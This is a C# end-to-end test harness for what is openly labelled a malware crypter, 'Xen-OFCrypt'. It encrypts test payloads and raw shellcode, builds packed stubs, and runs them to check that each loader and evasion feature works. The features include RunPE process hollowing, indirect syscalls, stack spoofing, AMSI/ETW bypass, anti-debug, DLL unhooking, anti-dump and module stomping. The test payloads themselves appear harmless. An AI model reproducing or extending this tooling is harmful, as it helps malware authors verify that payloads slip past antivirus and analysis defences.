using System;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Security.Cryptography;
using XanthoroxCrypted.Core;

// ═══════════════════════════════════════════════════════════
//  Extended E2E Test Suite — Ciphers & Execution Methods
//  NOTE: Fibers / CallbackProxy / ModuleStomp execute raw shellcode
//  (VirtualAlloc RWX + direct call), NOT PE .exe files.
//  These execution methods require position-independent shellcode
//  payloads and are SKIPPED when testing with a PE payload.
// ═══════════════════════════════════════════════════════════

string stubDir = @"D:\Development\projects\Malware\crypters\Xen-OFCrypt";
string outDir = Path.Combine(stubDir, "build", "out");
string stubPath = Path.Combine(outDir, "stub.exe");
string payloadPath = Path.Combine(stubDir, "build", "e2e_test", "bin", "test_payload_simple.exe");
string shellcodePath = Path.Combine(stubDir, "build", "e2e_test", "shellcode", "sc_test.bin");
string markerPath = @"C:\temp\runpe_marker.txt";
string scMarkerPath = @"C:\temp\sc_marker.txt";

if (!File.Exists(stubPath)) { Console.WriteLine("[FAIL] stub.exe not found"); return; }
if (!File.Exists(payloadPath)) { Console.WriteLine("[FAIL] test_payload_simple.exe not found"); return; }

byte[] rawPayload = File.ReadAllBytes(payloadPath);
byte[] stubTemplate = File.ReadAllBytes(stubPath);

int totalTests = 0, passed = 0, failed = 0, skipped = 0;

// ── Test runner ──
void RunTest(string name, BuildConfig config, CipherType cipher)
{
    totalTests++;
    Console.Write($"  [{totalTests}] {name,-45} ");

    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
    byte[] key = RandomNumberGenerator.GetBytes(32);
    byte[] encrypted = CryptoEngine.Encrypt(rawPayload, key, cipher);

    string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }

    if (File.Exists(markerPath)) File.Delete(markerPath);
    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    Thread.Sleep(200);

    var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }

    bool found = false;
    for (int i = 0; i < 8; i++)
    {
        Thread.Sleep(2000);
        if (File.Exists(markerPath))
        {
            string content = File.ReadAllText(markerPath);
            Console.WriteLine($"PASS ({(i + 1) * 2}s)");
            found = true;
            break;
        }
    }

    if (!found)
    {
        bool stillRunning = true;
        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
        proc.WaitForExit(1000);
        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
        Console.WriteLine($"FAIL (no marker, {detail})");
    }

    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    if (File.Exists(markerPath)) File.Delete(markerPath);
    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}

    if (found) passed++; else failed++;
}

// ═══════════════════════════════════════════════════════════
//  Shellcode Test Runner — for Fibers/CallbackProxy/ModuleStomp
//  These modes execute raw position-independent shellcode,
//  NOT PE .exe files. The marker is at C:\temp\sc_marker.txt.
// ═══════════════════════════════════════════════════════════

byte[] rawShellcode = null;
if (File.Exists(shellcodePath))
    rawShellcode = File.ReadAllBytes(shellcodePath);

void RunShellcodeTest(string name, BuildConfig config, CipherType cipher)
{
    totalTests++;
    Console.Write($"  [{totalTests}] {name,-45} ");

    if (rawShellcode == null)
    {
        Console.WriteLine("SKIP (no sc_test.bin)");
        skipped++;
        return;
    }

    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
    byte[] key = RandomNumberGenerator.GetBytes(32);
    byte[] encrypted = CryptoEngine.Encrypt(rawShellcode, key, cipher);

    string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }

    if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    Thread.Sleep(200);

    var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }

    bool found = false;
    for (int i = 0; i < 8; i++)
    {
        Thread.Sleep(2000);
        if (File.Exists(scMarkerPath))
        {
            string content = File.ReadAllText(scMarkerPath);
            Console.WriteLine($"PASS ({(i + 1) * 2}s) [{content.Trim()}]");
            found = true;
            break;
        }
    }

    if (!found)
    {
        bool stillRunning = true;
        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
        proc.WaitForExit(1000);
        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
        Console.WriteLine($"FAIL (no marker, {detail})");
    }

    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}

    if (found) passed++; else failed++;
}

// ═══════════════════════════════════════════════════════════
//  Cipher Tests — RunPE + each cipher algorithm
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Cipher Tests (RunPE + each algorithm) ──\n");

RunTest("RunPE + XOR + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunTest("RunPE + RC4 + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 2, IndirectSyscalls = true, StackSpoof = true },
    CipherType.RC4);

RunTest("RunPE + AES-256 + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 0, IndirectSyscalls = true, StackSpoof = true },
    CipherType.AES256);

RunTest("RunPE + ChaCha20 + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 1, IndirectSyscalls = true, StackSpoof = true },
    CipherType.ChaCha20);

// ═══════════════════════════════════════════════════════════
//  Execution Method Tests — Note on shellcode-only methods
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Execution Method Tests ──\n");

// Fibers / CallbackProxy / ModuleStomp — use raw shellcode payload
RunShellcodeTest("Fibers + XOR + IndirectSyscalls",
    new BuildConfig { Fibers = true, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunShellcodeTest("CallbackProxy + XOR",
    new BuildConfig { CallbackDiv = true, EncAlgorithm = 3 },
    CipherType.XOR);

RunShellcodeTest("ModuleStomp + XOR + IndirectSyscalls",
    new BuildConfig { ModuleStomp = true, EncAlgorithm = 3, IndirectSyscalls = true },
    CipherType.XOR);

// RunPE with all cipher algorithms (already tested above, but
// add AES/RC4/ChaCha without IndirectSyscalls for coverage)
RunTest("RunPE + AES-256 (no syscalls)",
    new BuildConfig { RunPE = true, EncAlgorithm = 0 },
    CipherType.AES256);

RunTest("RunPE + ChaCha20 (no syscalls)",
    new BuildConfig { RunPE = true, EncAlgorithm = 1 },
    CipherType.ChaCha20);

// ═══════════════════════════════════════════════════════════
//  Feature Toggle Tests
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Feature Toggle Tests ──\n");

RunTest("RunPE + XOR + PatchlessAmsiEtw",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, PatchlessAmsiEtw = true, IndirectSyscalls = true },
    CipherType.XOR);

RunTest("RunPE + XOR + AntiDebug",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, AntiDebug = true, IndirectSyscalls = true },
    CipherType.XOR);

RunTest("RunPE + XOR + KnownDllsUnhook",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, KnownDllsUnhook = true, IndirectSyscalls = true },
    CipherType.XOR);

RunTest("RunPE + XOR + AntiDump",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, AntiDump = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

// ═══════════════════════════════════════════════════════════
//  Long-Lived AntiDump Tests (all 4 layers active)
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Long-Lived AntiDump Tests ──\n");

RunShellcodeTest("Fibers + XOR + AntiDump",
    new BuildConfig { Fibers = true, EncAlgorithm = 3, AntiDump = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunShellcodeTest("CallbackProxy + XOR + AntiDump",
    new BuildConfig { CallbackDiv = true, EncAlgorithm = 3, AntiDump = true },
    CipherType.XOR);

// ═══════════════════════════════════════════════════════════
//  Summary
// ═══════════════════════════════════════════════════════════
Console.WriteLine($"\n{'═',-60}");
Console.WriteLine($"  E2E Results: {passed}/{totalTests} PASSED, {failed} FAILED, {skipped} SKIPPED");
Console.WriteLine($"{'═',-60}");

if (failed > 0)
    Environment.ExitCode = 1;
